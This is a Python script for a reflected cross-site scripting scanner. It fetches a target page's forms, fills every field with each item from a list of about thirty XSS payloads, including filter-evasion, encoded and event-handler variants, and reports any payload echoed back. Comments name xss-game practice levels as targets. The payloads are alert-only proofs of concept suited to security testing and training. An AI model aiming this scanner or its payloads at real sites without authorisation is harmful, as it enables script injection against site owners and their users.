import requests
from bs4 import BeautifulSoup
import re

#list of JavaScript payloads
js_payloads = [
    "<script>alert('XSS')</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "\"> <script>alert('XSS')</script>",
    "\"> <script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>\\u0061lert('22')</script>",
    "<script>eval('\\x61lert(\'33\')')</script>",
    "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
    "<img src=x onerror=alert('XSS');>",
    "<img src=x onerror=alert('XSS')//",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "\"> <img src=x onerror=alert('XSS');>",
    "\"> <img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)//",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "<svg id=alert(1) onload=eval(id)>",
    "\"> <svg/onload=alert(String.fromCharCode(88,83,83))>",
    "\"> <svg/onload=alert(/XSS/)",
    "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self-closing script)",
    "<svg><script>alert('33')",
    "<svg><script>alert&lpar;'33'&rpar;",
    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
    "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerup=\"alert(45)\">MOVE HERE</div>",
]

def get_all_forms(url):
    forms = []
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")
    return forms

def get_form_details(form):
    form_details = {} # Extract the form action (URL where the form data is sent)
    form_details['action'] = form.get('action', '')# Extract the form method (GET or POST)
    form_details['method'] = form.get('method', 'GET')# Extract input fields and their attributes (name, type)
    input_fields = form.find_all(['input', 'img', 'svg', 'div'])
    form_details['fields'] = []

    for input_field in input_fields:
        field = {}
        if input_field.name == 'input':
            field['name'] = input_field.get('name', '')
            field['type'] = input_field.get('type', '')
            field['id'] = input_field.get('id', '')
            field['value'] = input_field.get('value', '')
            field['placeholder'] = input_field.get('placeholder', '')
            field['required'] = input_field.get('required', False)  # Assuming it's a boolean
            field['min_length'] = input_field.get('minlength', 0)  # Assuming it's an integer
            field['max_length'] = input_field.get('maxlength', 0)  # Assuming it's an integer

            # Additional attributes for specific field types
            if field['type'] == 'url':
                field['pattern'] = input_field.get('pattern', '')
            elif field['type'] == 'search':
                field['autosave'] = input_field.get('autosave', '')
            elif field['type'] == 'tel':
                field['pattern'] = input_field.get('pattern', '')
        elif input_field.name == 'img':
            field['name'] = input_field.get('alt', '')
            field['type'] = 'img'
        elif input_field.name == 'svg':
            field['name'] = input_field.text
            field['type'] = 'svg'
        elif input_field.name == 'div':
            field['name'] = input_field.text
            field['type'] = 'div'

        form_details['fields'].append(field)

    return form_details

def submit_form(form_details, url, js_script):
    try:
        data = {}
        for field in form_details['fields']:
            data[field['name']] = js_script

        if form_details['method'].upper() == 'POST':
            response = requests.post(url + form_details['action'], data=data)
        else:
            response = requests.get(url + form_details['action'], params=data)

        return response

    except requests.exceptions.RequestException as e:
        print(f"Error submitting form: {e}")
        return None

def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    is_vulnerable = False
    for form in forms:
        for js_script in js_payloads:
            form_details = get_form_details(form)
            response = submit_form(form_details, url, js_script)
            # Check the content type of the response
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' in content_type:
                try:
                    content = response.content.decode('utf-8')
                except UnicodeDecodeError:
                    print("[!] Error: Binary data received, skipping this response.")
                    break
                if js_script in content:
                    print(f"[+] XSS Detected on {url}")
                    print(f"[*] Form details:")
                    print(form_details)
                    print(f"[*] Payload used:")
                    print(js_script)
                    is_vulnerable = True
                    break  # Stop after the first vulnerability is found
        if is_vulnerable:
            break  # Stop checking other forms once a vulnerability is found

    return is_vulnerable


def xss():
    while True:
        print("Enter Target website [http://www.domain_name] :")
        url = input("==> ")

        if re.match(r'http(s)?://', url):
            result = scan_xss(url)
            print(result)
            break  
        else:
            print("Invalid URL. Please provide a valid URL starting with 'http://' or 'https://'.")

#http://www.xss-game.appspot.com/level2/frame
#http://www.xss-game.appspot.com/level1/frame
#http://www.xss-game.appspot.com/level3/frame#1